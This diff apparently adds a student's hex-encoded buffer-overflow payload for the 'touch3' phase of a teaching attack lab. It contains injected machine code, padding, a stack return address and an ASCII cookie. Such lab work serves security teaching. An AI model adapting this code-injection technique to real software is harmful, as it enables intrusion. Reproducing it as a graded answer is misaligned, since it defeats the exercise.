@@ -1,0 +1,8 @@
+68 19 1d 40 00 48 c7 c7 /* push touch3 to stack */
+48 9f 62 55 c3 00 00 00 /* load cookie from exploit buffer to %rdi */
+00 00 00 00 00 00 00 00 /* buffer */
+00 00 00 00 00 00 00 00 /* buffer */
+00 00 00 00 00 00 00 00 /* buffer */
+18 9F 62 55 00 00 00 00 /* %rsp stack starts here */
+33 65 35 32 64 66 66 35 /* cookie value */
+00 00 00 00 00 00 00 00 /* null chars */
